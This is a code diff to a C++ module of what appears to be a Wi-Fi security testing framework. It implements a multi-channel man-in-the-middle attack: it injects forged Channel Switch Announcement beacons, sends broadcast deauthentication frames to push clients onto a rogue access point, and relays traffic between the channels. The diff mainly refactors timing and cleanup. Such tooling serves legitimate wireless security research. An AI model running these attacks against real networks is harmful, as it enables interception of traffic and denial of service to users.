@@ -1,6 +1,8 @@
 #include "attacks/mc_mitm/mc_mitm.h"
 
 #include <chrono>
+#include <reproc++/drain.hpp>
+#include <utility>
 #include <tins/tins.h>
 
 #include "attacks/DoS_hard/dos_helpers.h"
@@ -16,9 +18,9 @@ using namespace std;
 using namespace chrono;
 using namespace Tins;
 
-McMitm::McMitm(const ActorPtr &rogue_sta, const ActorPtr &rogue_ap, const ActorPtr &sta, const ActorPtr &ap,
+McMitm::McMitm(ActorPtr rogue_sta, const ActorPtr &rogue_ap, const ActorPtr &sta, const ActorPtr &ap,
 		const optional<filesystem::path> &run_folder, const bool only_to_mitm):
-	rogue_sta(rogue_sta),
+	rogue_sta(std::move(rogue_sta)),
 	rogue_ap(rogue_ap),
 	sta(sta),
 	ap(ap),
@@ -31,26 +33,18 @@ McMitm::McMitm(const ActorPtr &rogue_sta, const ActorPtr &rogue_ap, const ActorP
 McMitm::~McMitm() { stop(); }
 
 void McMitm::send_csa_beacon(const int numpairs, const optional<HWAddress<6>> &target) const {
-	const auto beacon_copy = unique_ptr<Dot11Beacon>(beacon->clone());
-
-	if(target.has_value()) beacon_copy->addr1(*target);
-
+	// Intel firmware: must see count >= 2 before count = 1; count = 3→0 covers all cases
 	for(int i = 0; i < numpairs; ++i) {
-		RadioTap csa_rt = CSA_attack::get_CSA_beacon(ap.get(SK::mac), netconfig.real_channel, netconfig.rogue_channel);
-		send_to_real(csa_rt);
-
-		// Intel firmware requires first receiving a CSA beacon with a count of 2 or higher,
-		// followed by one with a value of 1. When starting with 1 it errors out.
-		//TODO proč to nejde takhle? (asi jedno, ale bylo bylep39 vycházet z beacon_copy)
-		/*auto csa2 = append_csa(*beacon_copy, netconfig.rogue_channel, 2);
-		send_to_real(csa2);
-
-		auto csa1 = append_csa(*beacon_copy, netconfig.rogue_channel, 1);
-		send_to_real(csa1);*/
-
-		interruptible_sleep(milliseconds(100)); //TODO from config
+		for(int count = 3; count >= 0; --count) {
+			RadioTap csa_rt = CSA_attack::get_CSA_beacon(
+					ap.get(SK::mac), netconfig.real_channel, netconfig.rogue_channel, count, beacon.get());
+			if(target.has_value()) {
+				if(auto *b = csa_rt.find_pdu<Dot11Beacon>()) b->addr1(*target);
+			}
+			send_to_real(csa_rt);
+			interruptible_sleep(milliseconds(100)); //TODO from config
+		}
 	}
-	//log(LogLevel::INFO, "Injected {} CSA beacon pairs (moving stations to channel {})", numpairs, netconfig.rogue_channel);
 }
 //TODO simplify with Tins
 void McMitm::send_disas(const HWAddress<6> &macaddr) const {
@@ -91,12 +85,12 @@ void McMitm::setup_real_AP_RSN_frames() {
 
 	// get real AP beacon
 	beacon = scan::RSN_scan(rogue_sta.get(SK::iface),
-			20,
-			ap.get(SK::mac),
+			20, //TODO hardcoded timeouts
+			ap.get(SK::permanent_mac),
 			std::nullopt,
-			rogue_sta[SK::netns]); //TODO hardcoded tscan_timeout
-	if(!beacon)
-		throw run_err("No beacon received of network <{}>. Is monitor mode working? Did you enter the correct SSID?",
+			rogue_sta[SK::netns]);
+	if(beacon == nullptr)
+		throw run_err("No beacon received of network \"{}\". Is monitor mode working? Did you enter the correct SSID?",
 				ap.get(SK::ssid));
 
 	log(LogLevel::INFO,
@@ -115,6 +109,11 @@ void McMitm::setup_real_AP_RSN_frames() {
 }
 
 void McMitm::run(RunStatus &rs, const int timeout_sec) {
+
+	const auto &att_cfg = rs.config().at("attack_config");
+	const int beacon_interval_ms = att_cfg.at("beacon_interval_ms");
+	const int beacon_warning_sec = att_cfg.at("beacon_warning_sec");
+
 	const bool check_rogue_beacons = should_check_rogue_beacons();
 	log(LogLevel::INFO,
 		"Note: keep >1 meter between interfaces. Else packet delivery is unreliable & target may disconnect");
@@ -125,11 +124,10 @@ void McMitm::run(RunStatus &rs, const int timeout_sec) {
 			rogue_ap->get_mon_iface(),
 			netconfig.rogue_channel.ch_num);
 
-	// Now that we know the AP channel, put the monitor interface in active ACK mode
-	// for ACK back to AP
+	// put the monitor interface in active ACK mode for ACK back to AP
 
 	const string nic_client_ap = AP_IFACE_PREFIX + "client_ack"; //FIXME hardcoded
-	if(rogue_sta[BK::active_monitor]) { //FIXME not supported yet,_RSN_frames dont work with active
+	/*if(rogue_sta[BK::active_monitor]) { //FIXME not supported yet,_RSN_frames dont work with active
 		rogue_sta->set_iface_down();
 		rogue_sta->set_mac_address(client_state.get_mac());
 		rogue_sta->set_monitor_mode(true);
@@ -137,15 +135,11 @@ void McMitm::run(RunStatus &rs, const int timeout_sec) {
 		//interruptible_sleep(seconds(15));
 		//rogue_sta->run({"iw", "dev", rogue_sta.get(SK::iface), "set", "channel", to_string(netconfig.real_channel.ch_num)});
 		rogue_sta->set_iface_up();
-	} else {
+	} else {*/
 		rogue_sta->set_mac_address(client_state.get_mac());
 		// client need to ACK -> AP
 		start_ap(rs, nic_client_ap, rogue_sta, netconfig.real_channel, *beacon, client_state.get_mac());
-	}
-
-	/*rogue_sta->set_iface_down(); //TODO chenge to set_channel
-	rogue_sta->set_channel(Channel{netconfig.real_channel.ch_num, WifiBand::BAND_2_4, nullopt});
-	rogue_sta->set_iface_up();*/
+	//}
 
 	sock_real = make_unique<MonitorSocket>(rogue_sta.get(SK::iface), rogue_sta[SK::netns]);
 	const string bpf =
@@ -165,7 +159,7 @@ void McMitm::run(RunStatus &rs, const int timeout_sec) {
 	sock_rogue->set_filter(bpf);
 
 	log(LogLevel::INFO, "Giving the rogue AP one second to initialize ...");
-	interruptible_sleep(seconds(1));
+	interruptible_sleep(seconds(1)); //TODO needed?
 
 	rs.start_observers(ObserverRunPolicy::SKIP); //after mc_mitm preparation, skip because dmesg
 
@@ -173,7 +167,7 @@ void McMitm::run(RunStatus &rs, const int timeout_sec) {
 	send_csa_beacon(4);
 	client_state.update_state(ClientState::Sent_to_rogue);
 
-	// only for non MFP requests, AP -> broadcast
+	// only for non MFP clients, AP -> broadcast
 	Dot11Deauthentication deauth(HWAddress<6>::broadcast, ap.get(SK::mac));
 	deauth.addr3(ap.get(SK::mac));
 	deauth.reason_code(3);
@@ -182,7 +176,7 @@ void McMitm::run(RunStatus &rs, const int timeout_sec) {
 	// monitoring both channels and performing needed actions
 	last_real_beacon = steady_clock::now();
 	last_rogue_beacon = steady_clock::now();
-	auto next_beacon = steady_clock::now() + milliseconds(10);
+	auto next_beacon = steady_clock::now();
 	const auto start_time = steady_clock::now();
 
 	while(!stop_mitm) {
@@ -210,27 +204,29 @@ void McMitm::run(RunStatus &rs, const int timeout_sec) {
 		select(max_fd, &read_fds, nullptr, nullptr, &tv);
 
 		if(FD_ISSET(fd_real, &read_fds)) {
-			while(auto recv_res = sock_real->recv()) handle_rx_real_chan(recv_res.pdu, recv_res.raw);
+			while(auto recv_res = sock_real->recv())
+				handle_rx_real_chan(recv_res.pdu, recv_res.raw);
 		}
 		if(FD_ISSET(fd_rogue, &read_fds)) {
-			while(auto recv_res = sock_rogue->recv()) handle_rx_rogue_chan(recv_res.pdu, recv_res.raw);
+			while(auto recv_res = sock_rogue->recv())
+				handle_rx_rogue_chan(recv_res.pdu, recv_res.raw);
 		}
 
 		if(next_beacon <= steady_clock::now()) {
 			const bool client_associated = client_state.get_state() >= ClientState::GotMitm;
 			if(!client_associated) {
 				const bool custom = hooks && hooks->send_periodic_beacon(*this);
-				if(!custom) send_csa_beacon(1);
+				if(!custom) send_csa_beacon(1); //TODO add 3->0 counter
 			}
-			next_beacon += milliseconds(10); //TODO add to attack config
+			next_beacon += milliseconds(beacon_interval_ms);
 		}
 
-		if(last_real_beacon + seconds(2) < steady_clock::now()) {
+		if(last_real_beacon + seconds(beacon_warning_sec) < steady_clock::now()) {
 			log(LogLevel::WARNING, "Didn't receive beacon from real AP for two seconds");
 			last_real_beacon = steady_clock::now();
 		}
 
-		if(check_rogue_beacons && last_rogue_beacon + seconds(2) < steady_clock::now()) {
+		if(check_rogue_beacons && last_rogue_beacon + seconds(beacon_warning_sec) < steady_clock::now()) {
 			log(LogLevel::WARNING, "Didn't receive beacon from rogue AP for two seconds");
 			last_rogue_beacon = steady_clock::now();
 		}
@@ -239,33 +235,9 @@ void McMitm::run(RunStatus &rs, const int timeout_sec) {
 
 void McMitm::stop() {
 	log(LogLevel::INFO, "Cleaning up MitM...");
-	stop_ap(AP_IFACE_PREFIX + "ap", nullopt); //FIXME hardcoded
-	stop_ap(rogue_ap->get_ap_iface(), nullopt);
 	sock_real.reset();
 	sock_rogue.reset();
-}
-
-void McMitm::patch_channel_raw(vector<uint8_t> &beacon_raw, const uint8_t channel) {
-	if(beacon_raw.size() < 4) return;
-
-	const uint16_t old_rt_len = beacon_raw[2] | (beacon_raw[3] << 8);
-	const long header_fixed = old_rt_len + 24 + 12;
-	vector new_raw(beacon_raw.begin(), beacon_raw.begin() + header_fixed);
-
-	size_t effective_size = beacon_raw.size();
-	if(dos_helpers::check_fcs_present(beacon_raw)) { effective_size -= 4; }
-
-	size_t pos = header_fixed; // Tag parsing
-	while(pos + 2 <= effective_size) {
-		const uint8_t id = beacon_raw[pos];
-		const uint8_t len = beacon_raw[pos + 1];
-
-		if(pos + 2 + len > effective_size) break;
-
-		if((id == Dot11::DS_SET && len == 1) || (id == Dot11::HT_OPERATION && len >= 1)) {
-			beacon_raw[pos + 2] = channel;
-		}
-		pos += 2 + len;
-	}
+	stop_ap(AP_IFACE_PREFIX + "client_ack", rogue_sta[SK::netns]);
+	stop_ap(rogue_ap->get_ap_iface(), rogue_ap[SK::netns]);
 }
 }
